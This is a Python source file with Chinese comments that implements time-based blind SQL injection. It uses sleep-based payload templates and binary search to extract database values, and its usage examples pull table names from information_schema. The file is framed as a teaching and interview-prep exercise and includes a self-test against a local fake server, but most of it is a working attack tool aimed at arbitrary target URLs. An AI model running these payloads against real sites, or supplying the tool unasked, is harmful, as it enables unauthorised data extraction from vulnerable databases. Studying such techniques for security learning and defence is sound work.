"""时间盲注的最小实现：二分猜字符。

为什么手写一遍
--------------
sqlmap 会用，但面试问"时间盲注怎么判断真假"时，
答"跑 sqlmap"等于没答。手写过一次，你才知道：
  * 为什么要先测基线（否则网络抖动会被判成"真"）
  * 为什么用二分（26 次 → 7 次）
  * 为什么每次要重复确认（一次延迟可能是巧合）

用法
----
自测（不需要靶机）：
    python tools/blind_sqli.py --selftest

打真实目标：
    python tools/blind_sqli.py \
        --url "http://target/vuln.php?id=1" \
        --expr "database()" \
        --sleep 2

    # 猜表名
    python tools/blind_sqli.py --url "..." --expr "(select table_name from information_schema.tables where table_schema=database() limit 0,1)"

参数说明
--------
--expr      要猜的 SQL 表达式，脚本会自己套 substr(expr,pos,1)
--sleep     每次判定用几秒延时。**不要太短**，1 秒以内网络抖动分不清
--baseline  基线采样次数，默认 3 次取中位数
--tolerance 超过基线多少毫秒算"延迟"，默认 sleep*1000*0.6
"""

from __future__ import annotations

import argparse
import re
import statistics
import sys
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import quote

NO_PROXY = urllib.request.build_opener(urllib.request.ProxyHandler({}))

# 注入模板。-- 后面必须跟空格，否则注释不掉原语句的剩余部分
TEMPLATE_CMP = "1' and if(ascii(substr({expr},{pos},1))>{mid}, sleep({sleep}), 0) -- "
TEMPLATE_LEN = "1' and if(length({expr})>{mid}, sleep({sleep}), 0) -- "


class Client:
    def __init__(self, url: str, sleep: int, baseline_n: int = 3,
                 tolerance_ms: float | None = None, verbose: bool = True) -> None:
        self.url = url
        self.sleep = sleep
        self.baseline_n = baseline_n
        self.tolerance_ms = tolerance_ms if tolerance_ms is not None else sleep * 1000 * 0.6
        self.verbose = verbose
        self.baseline = 0.0
        self.requests = 0

    def _get(self, payload: str) -> float:
        """发请求，返回耗时（毫秒）。异常也返回一个很大的值。"""
        full = f"{self.url}{quote(payload, safe='')}"
        t0 = time.perf_counter()
        try:
            with NO_PROXY.open(full, timeout=self.sleep * 3 + 10) as resp:
                resp.read(64)
        except urllib.error.URLError:
            # 超时不等于失败：时间盲注里超时恰恰可能是"真"
            pass
        except Exception:  # noqa: BLE001
            pass
        self.requests += 1
        return (time.perf_counter() - t0) * 1000

    def calibrate(self) -> None:
        """测基线。不做这一步，后面的判断全是猜。"""
        samples = [self._get("1' and 1=1 -- ") for _ in range(self.baseline_n)]
        self.baseline = statistics.median(samples)
        if self.verbose:
            print(f"[基线] {self.baseline:.0f} ms"
                  f"（采样 {len(samples)} 次：{', '.join(f'{s:.0f}' for s in samples)}）")
            print(f"[判定] 超过 {self.baseline + self.tolerance_ms:.0f} ms 算『真』\n")

    def is_true(self, payload: str, repeat: int = 2) -> bool:
        """判定一次条件真假。

        repeat > 1 是为了排除偶然：网络抖一下可能慢几百毫秒，
        但连续两次都慢到 sleep 级别，基本可以确定是 sleep 生效。
        """
        threshold = self.baseline + self.tolerance_ms
        hits = 0
        for _ in range(repeat):
            elapsed = self._get(payload)
            if elapsed > threshold:
                hits += 1
        return hits >= max(1, repeat - 1)

    def guess_length(self, expr: str) -> int:
        lo, hi = 0, 64
        while lo < hi:
            mid = (lo + hi) // 2
            payload = TEMPLATE_LEN.format(expr=expr, mid=mid, sleep=self.sleep)
            if self.is_true(payload):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def guess_string(self, expr: str, length: int, charset: str = "") -> str:
        """二分猜字符：可打印 ASCII 32–126，约 7 次一个字符。"""
        out = []
        for pos in range(1, length + 1):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                payload = TEMPLATE_CMP.format(expr=expr, pos=pos, mid=mid, sleep=self.sleep)
                if self.is_true(payload):
                    lo = mid + 1
                else:
                    hi = mid
            out.append(chr(lo))
            if self.verbose:
                print(f"\r  {''.join(out)}", end="", flush=True)
        if self.verbose:
            print()
        return "".join(out)


# ---------------------------------------------------------------------------
# 自测：起一个假的注入点，验证猜解逻辑
# ---------------------------------------------------------------------------
class _FakeHandler(BaseHTTPRequestHandler):
    secret = "dvwa"
    sleep_sec = 1

    def log_message(self, *a):  # 关掉访问日志
        pass

    def do_GET(self):
        from urllib.parse import unquote
        payload = unquote(self.path)

        delay = 0
        # 长度判定：length(expr)>N
        m = re.search(r"length\((.*)\)>(\d+)", payload)
        if m:
            if len(self.secret) > int(m.group(2)):
                delay = self.sleep_sec
        else:
            # 字符判定：ascii(substr(expr,POS,1))>MID
            m2 = re.search(r"substr\((.*)\),(\d+),1\)\)>(\d+)", payload)
            if m2:
                pos, mid = int(m2.group(2)), int(m2.group(3))
                ch = self.secret[pos - 1] if pos <= len(self.secret) else "\x00"
                if ord(ch) > mid:
                    delay = self.sleep_sec

        time.sleep(delay)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")


def selftest() -> int:
    import os
    port = 18123
    srv = HTTPServer(("127.0.0.1", port), _FakeHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"自测靶点：http://127.0.0.1:{port}  真实值 = {_FakeHandler.secret!r}")
    print("它会根据 payload 中的条件决定是否 sleep —— 逻辑和真实盲注一致\n")

    c = Client(f"http://127.0.0.1:{port}/x.php?id=", sleep=1, baseline_n=3)
    c.calibrate()

    print("猜长度 ...")
    n = c.guess_length("database()")
    print(f"长度 = {n}（真实 {len(_FakeHandler.secret)}）\n")

    if n != len(_FakeHandler.secret):
        print("✗ 长度猜错，后续跳过")
        srv.shutdown()
        return 1

    print("猜内容 ...")
    got = c.guess_string("database()", n)
    srv.shutdown()

    ok = got == _FakeHandler.secret
    print(f"\n猜解结果: {got!r}")
    print(f"真实结果: {_FakeHandler.secret!r}")
    print(f"{'✓ 通过' if ok else '✗ 失败'}　共 {c.requests} 次请求")
    print(f"\n对比暴力猜：{n} 字符 × 95 个可打印字符 = {n * 95} 次")
    print(f"二分猜：约 {n * 7 + 7} 次，少 {100 - (n * 7 + 7) * 100 // (n * 95)}%")
    return 0 if ok else 1


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="时间盲注：二分猜字符")
    ap.add_argument("--selftest", action="store_true", help="起本地假靶点验证逻辑")
    ap.add_argument("--url", help="含注入点的 URL，参数值写 1")
    ap.add_argument("--expr", default="database()", help="要猜的 SQL 表达式")
    ap.add_argument("--sleep", type=int, default=2, help="判定用的延时秒数")
    ap.add_argument("--baseline", type=int, default=3, help="基线采样次数")
    ap.add_argument("--length", type=int, default=0, help="已知长度可跳过长度探测")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()

    if not args.url:
        ap.print_help()
        return 1

    print(f"目标: {args.url}")
    print(f"表达式: {args.expr}")
    print("⚠️ 只对你有授权的目标使用。\n")

    c = Client(args.url, args.sleep, args.baseline)
    c.calibrate()

    n = args.length or c.guess_length(args.expr)
    if n <= 0 or n > 64:
        print(f"长度探测异常（{n}），可能：注入点不存在 / sleep 被拦截 / 阈值不合适")
        return 2
    print(f"长度 = {n}\n")

    value = c.guess_string(args.expr, n)
    print(f"\n结果: {value}")
    print(f"请求数: {c.requests}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
